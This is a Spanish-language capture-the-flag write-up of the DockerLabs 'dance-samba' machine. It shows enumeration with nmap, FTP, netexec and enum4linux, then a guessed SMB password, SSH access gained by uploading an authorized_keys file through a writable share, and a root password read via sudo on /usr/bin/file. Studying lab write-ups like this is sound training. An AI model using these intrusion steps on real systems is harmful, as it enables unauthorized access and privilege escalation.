Propiedades:
- OS: Linux
- Plataforma: DockerLabs
- Nivel: Medio
- Tags: #password-gueessing #samba #enum4linux #netexec #ftp

![](assets/Pasted%20image%2020260103005159.png)

## Reconocimiento

Comienzo tirando un ping para comprobar conectividad.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/dance-samba]
└─$ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.142 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.142/0.142/0.142/0.000 ms
```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/dance-samba]
└─$ sudo nmap -p- -Pn -n -sS --min-rate 5000 -vvv 172.17.0.2

Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE      REASON
21/tcp  open  ftp          syn-ack ttl 64
22/tcp  open  ssh          syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
```

- Puertos 21 FTP, 22 SSH, 445 y 139 Samba

Sobre los puertos abiertos tiro un segundo escaneo mas profundo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/dance-samba]
└─$ sudo nmap -p 21,22,139,445 -sV -sC -Pn -n -vvv 172.17.0.2 -oN target

PORT    STATE SERVICE     REASON         VERSION
21/tcp  open  ftp         syn-ack ttl 64 vsftpd 3.0.5
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              69 Aug 19  2024 nota.txt
22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a2:4e:66:7d:e5:2e:cf:df:54:39:b2:08:a9:97:79:21 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHAIsNDTAA/0XQjWsHZBAXtCPn1pDRyMrwgY5uPsCW08SIzEJ61AV9NHFoF09tEsl3wOl9R92ZXrHyslcnacApY=
|   256 92:bf:d3:b8:20:ac:76:08:5b:93:d7:69:ef:e7:59:e1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBnq5Qj1E5WOsDQlUkhGJ3A5DhC7WSVKpx0LeT1YVXN6
139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4
445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time:
|   date: 2026-01-03T05:45:24
|_  start_date: N/A
|_clock-skew: 0s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 21783/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 30701/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 58197/udp): CLEAN (Failed to receive data)
|   Check 4 (port 36620/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
```

- Puerto 21 FTP: vsftpd 3.0.5 y tiene el login anonymous activo.
- Puerto 22 SSH: OpenSSH 9.6p1 Ubuntu 3ubuntu13.4
- Puerto 139 y 445 Samba: Samba smbd 4
## Enumeración

### Puerto 21 FTP

Me conecte como anonymous al servicio FTP.

- Existía un archivo llamado nota.txt que me descargue.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/dance-samba]
└─$ ftp 172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 3.0.5)
Name (172.17.0.2:wndr): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
229 Entering Extended Passive Mode (|||9391|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              69 Aug 19  2024 nota.txt
226 Directory send OK.

ftp> get nota.txt
```

Inspeccione el archivo y vi lo siguiente:

- Posible usuario macarena.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/dance-samba]
└─$ cat content/nota.txt

I don't know what to do with Macarena, she's obsessed with donald.
```

### Servicio SMB

Enumere los shares a los que tengo acceso con Null Session

- Nada.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/dance-samba]
└─$ nxc smb 172.17.0.2 -u '' -p '' --shares
SMB         172.17.0.2      445    5C7CFB1A160E     [*] Unix - Samba (name:5C7CFB1A160E) (domain:5C7CFB1A160E) (signing:False) (SMBv1:False)
SMB         172.17.0.2      445    5C7CFB1A160E     [+] 5C7CFB1A160E\:
SMB         172.17.0.2      445    5C7CFB1A160E     [*] Enumerated shares
SMB         172.17.0.2      445    5C7CFB1A160E     Share           Permissions     Remark
SMB         172.17.0.2      445    5C7CFB1A160E     -----           -----------     ------
SMB         172.17.0.2      445    5C7CFB1A160E     print$                          Printer Drivers
SMB         172.17.0.2      445    5C7CFB1A160E     macarena
SMB         172.17.0.2      445    5C7CFB1A160E     IPC$                            IPC Service (5c7cfb1a160e server (Samba, Ubuntu))
```

Por lo cual utilice`enum4linux` para enumerar posibles usuarios.

- Usuario macarena confirmado.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/dance-samba]
└─$ enum4linux 172.17.0.2

 ========================================( Users on 172.17.0.2 )========================================

index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: macarena Name: macarena  Desc:

user:[macarena] rid:[0x3e8]
```


La nota decía que macarena estaba obsesionado con donald, por lo cual utilice donald como password para tratar de enumerar los shares como el usuario macarena.

- macarena tiene permisos de lectura y escritura en el recurso macarena.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/dance-samba]
└─$ nxc smb 172.17.0.2 -u 'macarena' -p 'donald' --shares
SMB         172.17.0.2      445    5C7CFB1A160E     [*] Unix - Samba (name:5C7CFB1A160E) (domain:5C7CFB1A160E) (signing:False) (SMBv1:False)
SMB         172.17.0.2      445    5C7CFB1A160E     [+] 5C7CFB1A160E\macarena:donald
SMB         172.17.0.2      445    5C7CFB1A160E     [*] Enumerated shares
SMB         172.17.0.2      445    5C7CFB1A160E     Share           Permissions     Remark
SMB         172.17.0.2      445    5C7CFB1A160E     -----           -----------     ------
SMB         172.17.0.2      445    5C7CFB1A160E     print$          READ            Printer Drivers
SMB         172.17.0.2      445    5C7CFB1A160E     macarena        READ,WRITE
SMB         172.17.0.2      445    5C7CFB1A160E     IPC$                            IPC Service (5c7cfb1a160e server (Samba, Ubuntu))
```

Me conecte al recurso y me di cuenta que parece una replica del directorio `/home`, supongo que del usuario macarena.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/dance-samba/content]
└─$ smbclient //172.17.0.2/macarena -U 'macarena%donald'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jan  2 23:53:16 2026
  ..                                  D        0  Fri Jan  2 23:53:16 2026
  .bash_logout                        H      220  Mon Aug 19 11:18:51 2024
  .profile                            H      807  Mon Aug 19 11:18:51 2024
  .cache                             DH        0  Mon Aug 19 11:40:39 2024
  .bashrc                             H     3771  Mon Aug 19 11:18:51 2024
  .bash_history                       H        5  Mon Aug 19 12:26:02 2024
  user.txt                            N       33  Mon Aug 19 11:20:25 2024

                12087176 blocks of size 1024. 9540380 blocks available
```

Me baje e inspecciona la flag user.txt 

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/dance-samba/content]
└─$ cat user.txt
ef65ad731de0ebabcb371fa3ad4972f1
```

## Intrusion.

Al tener permisos de escritura en el recurso `macarena` (que replica el directorio `/home`), podemos crear y subir un par de llaves SSH mediante SMB. Esto nos habilitará la conexión por SSH utilizando nuestra propia credencial.

- Este comando creara un par de claves ssh, la privada que servirá para conectarme y la publica que subiremos al smb.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/dance-samba]
└─$ ssh-keygen -t ed25519 -f macarena_key -C "macarena@pwn"

Generating public/private ed25519 key pair.
Enter passphrase for "macarena_key" (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in macarena_key
Your public key has been saved in macarena_key.pub
The key fingerprint is:
SHA256:6C+RuExsNV6qlebKo/sKQ94F1yRBb8dWIJVXEADEgfw macarena@pwn
The key's randomart image is:
+--[ED25519 256]--+
|    o+=*+++++.   |
|     o=.o...     |
|   . ..+ +.      |
|    o +E+        |
| . . =.*S        |
|o . *.O          |
|o. = *..         |
| o .= o.         |
|  +=+o ..        |
+----[SHA256]-----+
```

Me conecto al recurso `macarena` del smb y creo los directorios necesarios para subir la clave publica que cree.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/dance-samba/content]
└─$ smbclient //172.17.0.2/macarena -U 'macarena%donald'

smb: \> mkdir .ssh
smb: \> cd .ssh
smb: \.ssh\> put macarena_key.pub authorized_keys
putting file macarena_key.pub as \.ssh\authorized_keys (18.4 kB/s) (average 14.1 kB/s)
```

Ahora que ya subimos la clave publica, podemos utilizar la clave privada para conectarnos por SSH.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/dance-samba/content]
└─$ ssh -i macarena_key macarena@172.17.0.2
Enter passphrase for key 'macarena_key':

Last login: Mon Aug 19 18:40:39 2024 from 172.17.0.1
macarena@5c7cfb1a160e:~$ id
uid=1001(macarena) gid=1001(macarena) groups=1001(macarena),100(users)
macarena@5c7cfb1a160e:~$
```

## Escalada de Privilegios

Dentro del sistema existía un directorio `/home/secret` que contenía el siguiente hash.

- Es una cadena en base32.

```bash
macarena@5c7cfb1a160e:/home/secret$ cat hash
MMZVM522LBFHUWSXJYYWG3KWO5MVQTT2MQZDS6K2IE6T2===
```

Descodifique la cadena lo cual me dio como resultado otra cadena pero codificada en base64 la cual también descodifique.

```bash
┌──(wndr㉿wndr)-[~/Machines/dockerlabs/dance-samba]
└─$ echo "MMZVM522LBFHUWSXJYYWG3KWO5MVQTT2MQZDS6K2IE6T2===" | base32 -d; echo
c3VwZXJzZWN1cmVwYXNzd29yZA==

┌──(wndr㉿wndr)-[~/Machines/dockerlabs/dance-samba]
└─$ echo "c3VwZXJzZWN1cmVwYXNzd29yZA==" | base64 -d; echo
supersecurepassword
```

- Obtenemos una contraseña: supersecurepassword

Utilice esta contraseña para el usuario root pero no funciono, por lo cual la utilice para el usuario macarena y realizar un `sudo -l` que me permite la enumeracion de binarios con privilegios SUDO.

```bash
macarena@5c7cfb1a160e:/home/secret$ sudo -l
[sudo] password for macarena:
Matching Defaults entries for macarena on 5c7cfb1a160e:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User macarena may run the following commands on 5c7cfb1a160e:
    (ALL : ALL) /usr/bin/file
```

- Puedo ejecutar el binario /usr/bin/file como cualquier usuario sin contraseña.


Dentro del directorio `/opt` me encontré con un archivo password.txt que pertenece al usuario root. Supongo que este archivo contendra su contraseña

```bash
macarena@5c7cfb1a160e:/opt$ ls -la
total 12
drwxr-xr-x 1 root root 4096 Aug 19  2024 .
drwxr-xr-x 1 root root 4096 Jan  3 06:37 ..
-rw------- 1 root root   16 Aug 19  2024 password.txt
```

Podemos abusar del binario `file` para leer un archivo.

- Ejecutamos el binario `file` como el usuario root para leer el archivo `password.txt`

```bash
macarena@5c7cfb1a160e:/opt$ export LFILE=/opt/password.txt
macarena@5c7cfb1a160e:/opt$ sudo /usr/bin/file -f $LFILE
root:rooteable2: cannot open `root:rooteable2' (No such file or directory')
macarena@5c7cfb1a160e:/opt$
```

- Obtenemos las credenciales root:rooteable2

Ahora podemos migrar al usuario root.

```bash
macarena@5c7cfb1a160e:/opt$ su root
Password:
root@5c7cfb1a160e:/opt# id
uid=0(root) gid=0(root) groups=0(root)
root@5c7cfb1a160e:/opt# whoami
root

root@5c7cfb1a160e:~# cat true_root.txt
efb6984b9b0eb57451aca3f93c8ce6b7
```

***PWNED***